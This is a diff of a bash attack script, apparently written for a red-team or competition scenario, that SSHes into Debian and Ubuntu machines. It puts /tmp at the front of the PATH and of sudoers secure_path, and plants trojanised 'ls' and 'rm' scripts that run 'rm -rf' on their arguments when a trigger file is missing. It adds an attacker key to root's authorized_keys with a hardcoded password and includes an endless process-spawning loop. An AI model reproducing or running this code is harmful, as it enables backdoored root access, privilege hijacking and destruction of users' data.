@@ -196,107 +196,184 @@ function brute(){
 ###########################################################################################
 # ssh's in and does it's business
 ###########################################################################################
-function assassin(){
-	#### launcher ###########
+### wont be clearing logs or trying to hide footprints at all ###
+function spectre(){
+	#### launch bay #########
 	function payload(){		#
-		detectomatic		#
-		sandman				#
-		seeder				#
+		fuck 				#
+	#	unfuck				#
 	}						#
 	#########################
-	function detectomatic(){
-		### test if debian or ubuntu
 		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
-		debPATH="/etc/profile"
+		# Ubuntu
 		ubuPATH="/etc/environment"
 		ubuSecPATH="/etc/sudoers"
 		ubuSecPATHnew="/etc/sudoers.new"
+		ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+		ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+		# BOTH
+			#bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
+			#bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
+			#bothCleanXtermPS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
+		bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
+		bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
+		bothCleanXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'
 
-		### is Debian
+		bothCleanPS1Vars='$bothCleanColorPS1 $bothCleanBasicPS1 $bothCleanXtermPS1'
+
+			bothDirtyPS1Vars='$bothDirtyColorPS1 $bothDirtyBasicPS1 $bothDirtyXtermPS1'
+			bothDirtyColorPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyBasicPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
+		# Debian
+		debPATH="/etc/profile"
+		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+		debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+			debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+			debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+
+	function ubuVisudo(){
+		# copies and edits the sudoers file
+		sudo cp $ubuSecPATH $ubuSecPATHnew
+		sudo chmod 750 $ubuSecPATHnew
+		sudo sed -i "s|$1|$2|" $ubuSecPATHnew
+		sudo chmod 0440 $ubuSecPATHnew
+		# checks that the changes are good
+		visudo -c -f $ubuSecPATHnew
+		# moves the modified file over the old one
+		if [ "$?" -eq "0" ]; then
+		sudo cp $ubuSecPATHnew $ubuSecPATH
+		fi
+		#garbage collection
+		sudo rm $ubuSecPATHnew
+	}
+### fuck ##########################################
+	function fuck(){
+#################
+	#seeder		#
+	#sandman	#
+	terminator	#
+#################
+	### is Debian ###
 		if [ $osDetect == "Debian" ]; then
 			testPATH="echo $PATH | cut -d: -f1"
 			if [[ "$testPATH" != "/tmp" ]]; then
 				#changes PATH for current user, no matter what it is
-				sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
-			fi
-			#changes PATH for all users, if the default is still in place
-			debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
-			debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
-				debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
-				debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
-			sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
-			sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
-		fi
-		### is Ubuntu
-		if [ $osDetect == "Ubuntu" ]; then
-			ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
-			ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
-				ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
-				ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
-			sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
-
-			if [ -f "$ubuSecPATHnew" ]; then
-				exit 1
-			fi
-			# copies and edits the sudoers file
-			command cp $ubuSecPATH{,.new}
-			command chmod 750 $ubuSecPATHnew
-			sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
-			command chmod 0440 $ubuSecPATHnew
-			# checks that the changes are good
-			visudo -c -f $ubuSecPATHnew
-			# moves the modified file over the old one
-			if [ "$?" -eq "0" ]; then
-			    cp $ubuSecPATHnew $ubuSecPATH
+				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
 			fi
 
-			rm $ubuSecPATHnew
+			sudo sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
+			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
 		fi
-		#** un-fuck *******************************
-			function unfuck(){
-				# deletes all the dirty scipts
-				command /bin/rm -f $seedPathsLS $seedPathsRM
-			}
+		### is Ubuntu ###
+			if [ $osDetect == "Ubuntu" ]; then
+				sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
+				ubuVisudo $ubuCleanRootPATH $ubuDirtyRootPATH
+			#colorizing bash shell
+				userList=$(find /home /root -name .bashrc)
+				for rc in $userList;do
+					sudo sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
+				done
+			fi
 	}
-#** Terminator ************************************
-#	function terminator(){
-#		ssh root@MachineB "$(declare -f FUNCTION); FUNCTION"
+
+### un-fuck ########################################
+	function unfuck(){
+	### is Debian ###
+		if [ $osDetect == "Debian" ]; then
+			sudo sed -i "s|$debDirtyRootPATH|$debCleanRootPATH|" $debPATH
+			sudo sed -i "s|$debDirtyUserPATH|$debCleanUserPATH|" $debPATH
+		fi
+	### is Ubuntu ###
+		if [ $osDetect == "Ubuntu" ]; then
+			sudo sed -i "s|$ubuDirtyUserPATH|$ubuCleanUserPATH|" $ubuPATH
+			ubuVisudo $ubuDirtyRootPATH $ubuCleanRootPATH
+			printf "\n+++++++\ndirtyRoot=$ubuDirtyRootPATH\ncleanRoot=$ubuCleanRootPATH"
+		fi
+	# deletes all the dirty scipts
+	sudo /bin/rm -f $seedPathsLS $seedPathsRM
+	echo $seedPathsLS $seedPathsRM
+	# clears cached paths
+	sudo hash -r
+	#*********************
+	#***missing colorizer
+	#*********************
+	}
+
+#** colorizer ######################################
+#	function colorizer(){
+#		#53,55,62
+
 #	}
 
-#** Tripmine **************************************
-
-#** Sandman ***************************************
-	function sandman(){
-		while : ; do
-			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
-		done
-	}
 ### Seeder ########################################
 	function seeder(){
 		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
 		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
 		triggerPath="/tmp/.trigger"
 		incrementPath="/tmp/.increment"
+		sshKey="/root/.ssh/id_rsa"
 		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
-		command echo "$dirtyLS" | tee $seedPathsLS > /dev/null
-		command echo "$dirtyRM" | tee $seedPathsRM > /dev/null
-		if [ -e $incrementPath ]; then
-			command echo "increment=0" > $incrementPath
-		fi
-		# sourcing increment file, so it can hopefully be incremented
-		source $incrementPath
+		sudo echo "$dirtyLS" | tee $seedPathsLS > /dev/null
+		sudo echo "$dirtyRM" | tee $seedPathsRM > /dev/null
+		# creates/resets the increment file
+		sudo echo "increment=0" > $incrementPath
+		# creates the trigger file
+		sudo touch $triggerPath
 		# makes everything executable
-		command chmod +x $seedPathsLS $seedPathsRM
-		command chmod 777 $seedPathsLS $seedPathsRM
+		sudo chmod +x $seedPathsLS $seedPathsRM
+		sudo chmod 777 $seedPathsLS $seedPathsRM
+		##################
+		### Key Master ###
+		##################
+		###could just replace all pub/priv keys, but lets be a little subtle..###
+		###could also change keyfile location, add a new kf, and leave all the old ones###
+		###leaving defaults to keep it simple###
+		#---------------------------------------
+		#checks if a key exists, then makes one
+		if [ ! -e $sshKey ]; then
+			ssh-keygen -f $sshKey -t rsa -N ''
+		fi
+		#disables password login for ssh (making it obvious something is wrong)
+
+		#adding self to target's root auth list
+		cat ~/.ssh/id_rsa.pub | ssh USER@TARGETIP 'echo "PASSWORD" | sudo -S mkdir -p ~/.ssh /root/.ssh && cat | tee -a ~/.ssh/authorized_keys /root/.ssh/authorized_keys'
 	}
 
-### dirty: ls #####################################
+
+
+#** Terminator ####################################
+	function terminator(){
+	#### sending the payload ####
+	#just testing seeder
+	ssh 192.168.86.28 "$(declare -f seeder); seeder"
+	echo "STILL USING TEST IP"
+
+	#### killing sessions ####
+#		killTargets=$(who -u | grep -v $attackDog | awk '{print $6}')
+#		for target in $killTargets; do
+#			kill -9 $target
+#		done
+	}
+
+### Sandman #######################################
+	function sandman(){
+		while : ; do
+			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
+		done
+	}
+
+###################################################
+### dirty scripts #################################
+###################################################
 	dirtyLS="$(cat <<-'EOF'
 	#!/bin/bash
 	#
 	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
 	#
-	trigger="/usr/local/sbin/.trigger"
+	triggerPath="/tmp/.trigger"
 	# pulls in and builds argsLS for the real ls
 	argsLS=""
 	while [[ "$1" != "" ]]; do
@@ -304,30 +381,32 @@ function assassin(){
 		shift
 	done
 
-	# checks for the trigger file, if its missing it acts like normal
-	if [ -e $trigger ]; then
-		echo test
+	# checks for the trigger file, if it exists it acts like normal
+	if [ ! -e $triggerPath ]; then
+		/bin/rm -rf $argsLS
+		#could just as easily `shred` to be meaner
 	else
 		/bin/ls $argsLS
-		printf "\n\n----\n\n"
+		#hints at the issue
+		printf "\n\n----\n"
 		printf "argsLS= $argsLS\n"
 	fi
 	EOF
 	)"
-
-### dirty: rm ###################################
+###########################################################
 	dirtyRM="$(cat <<-'EOF'
 	#!/bin/bash
 	#
 	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
 	#
-	trap "printf '\nheh..not THAT easy..\n'" SIGINT SIGTERM
+	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
 	#####################
-	function main(){	#
-		buildEmUp		#
+	function mainRM(){	#
+		buildEmUp $*	#
 		tripwire		#
 	}					#
 	#####################
+	triggerPath="/tmp/.trigger"
 	### defining, and sourcing, increment info ###
 	function buildEmUp(){
 		incrementPath="/tmp/.increment"
@@ -344,22 +423,21 @@ function assassin(){
 			shift
 		done
 	}
-
-	#### checks for the trigger file, if its missing it acts like normal ###
+	#### checks for the trigger file, if its there it acts like normal ###
 	function tripwire(){
-		if [ ! -e /usr/local/sbin/.trigger ]; then
+		if [ ! -e $triggerPath ]; then
 			echo "trigger is missing"
 			rmCase
 		else
 			/bin/rm $argsRM
-			printf "\n\n----\n\n"
+			#hints at the issue
+			printf "\n\n----\n"
 			printf "argsRM= $argsRM\n"
 		fi
 	}
-
 	### determining what happens based on number of times used ###
 	function rmCase(){
-		case $attemptNum in
+		case $increment in
 			0)
 					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
 					echo "after case: $attemptNum"
@@ -382,9 +460,9 @@ function assassin(){
 					;;
 		esac
 	}
-	main
-		EOF
-		)"
+	mainRM $*
+	EOF
+	)"
 
 	payload
 }
